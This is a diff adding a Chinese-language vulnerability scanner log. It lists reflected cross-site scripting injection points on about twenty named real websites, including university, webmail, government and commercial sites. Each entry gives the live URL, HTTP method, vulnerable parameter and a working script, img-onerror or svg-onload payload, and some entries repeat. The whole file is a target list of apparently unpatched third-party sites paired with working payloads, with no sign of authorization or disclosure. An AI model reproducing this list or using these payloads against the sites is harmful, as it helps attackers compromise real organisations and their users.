@@ -1,0 +1,115 @@
+检测网址 : https://mail.sina.net/huodong/selfservice/index.php?s=</script>"><script>prompt(1)</script>50b8e1367fa890d8b9a7e18ace84cb17356e652f_174
+提交方式 : GET
+漏洞参数 : s
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://mytube.ncku.edu.tw/media.php?id=</script>"><script>prompt(1)</script>3857
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : https://mail.sina.net/huodong/selfservice/index.php?s=</script>"><script>prompt(1)</script>50b8e1367fa890d8b9a7e18ace84cb17356e652f_174
+提交方式 : GET
+漏洞参数 : s
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://zjsl.com.cn/information_det.php?cid="><img src=x onerror=prompt(1)>116&id=560
+提交方式 : GET
+漏洞参数 : cid
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://projects.zlgc.chaoxing.com/column/columnList?courseId=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&columnId=24&courseInfoId=4&code=index&prefix=gxtznn
+提交方式 : POST
+漏洞参数 : courseId
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://projects.zlgc.chaoxing.com/column/columnList?courseId=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&columnId=24&courseInfoId=4&code=index&prefix=gxtznn
+提交方式 : POST
+漏洞参数 : courseId
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://reg.eduu.com/login/?url=</script>"><script>prompt(1)</script>http://school.zhongkao.com/school/xxdp/249632/
+提交方式 : GET
+漏洞参数 : url
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://pc.weathercn.com/weather/week/106577/?partner=</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>&p_source=&p_type=jump
+提交方式 : GET
+漏洞参数 : partner
+攻击载荷 : </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+------------------------------------
+检测网址 : http://www1.resset.cn:8080/product/UserLogin?loginName=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&loginPwd=fzfu
+提交方式 : POST
+漏洞参数 : loginName
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://sxqzy.cnxincai.com/schoolreception/menu/type?type=0&id=</script>"><script>prompt(1)</script>e907a855-56a8-4596-8026-a214dd5727f6&sId=aa706694906b41eaa8820d4727d9998f
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : https://www.telecomhr.com/jobs/tags.php?id=100&page= and 1=2 <script>alert(1)</script>2
+提交方式 : GET
+漏洞参数 : page
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://mytube.ncku.edu.tw/media.php?id=</script>"><script>prompt(1)</script>3857
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://video.fy.chaoxing.com/video/detail_5440_0.html?webType=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&prefix=gxibvc
+提交方式 : POST
+漏洞参数 : webType
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : https://ir.lib.ncu.edu.tw:444/topsite.asp?id=</script>"><script>prompt(1)</script>Hits
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://passport.baike.com/user/qiye/register.jsp?autourl=</script>"><script>prompt(1)</script>http://qiye.baike.com/qiyeDocCategory.do?action=showFirstCategory
+提交方式 : GET
+漏洞参数 : autourl
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://ccitzs.ccit.js.cn/infoshows.asp?id="><h1 onclick=prompt(1)>Clickme</h1>55
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : "><h1 onclick=prompt(1)>Clickme</h1>
+------------------------------------
+检测网址 : https://www.okdai.com/okplans/disclosure.xhtml?v=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : v
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : https://www.midifan.com/modulearticle-index.htm?title=</script>"><script>prompt(1)</script>sonar
+提交方式 : GET
+漏洞参数 : title
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://shenbao.gdpepe.cn/page/html/18zl4.php?catid="><svg/onload=prompt(1)>3457
+提交方式 : GET
+漏洞参数 : catid
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------------------------
+检测网址 : https://tisch.nyu.edu/tisch-research-news-events/news?filter=</script>"><script>prompt(1)</script>faculty
+提交方式 : GET
+漏洞参数 : filter
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : https://fah.um.edu.mo/staff/?group="><img src=x onerror=prompt(1)>japanese
+提交方式 : GET
+漏洞参数 : group
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://www.dreams-travel.com/sc/sc_hlg/yt_1tq.asp?lmtop=</script>"><script>prompt(1)</script>yt_1tq
+提交方式 : GET
+漏洞参数 : lmtop
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://baojia.jinmajia.com/ab.jsp?itemid=</script>"><script>prompt(1)</script>1371778273256212
+提交方式 : GET
+漏洞参数 : itemid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
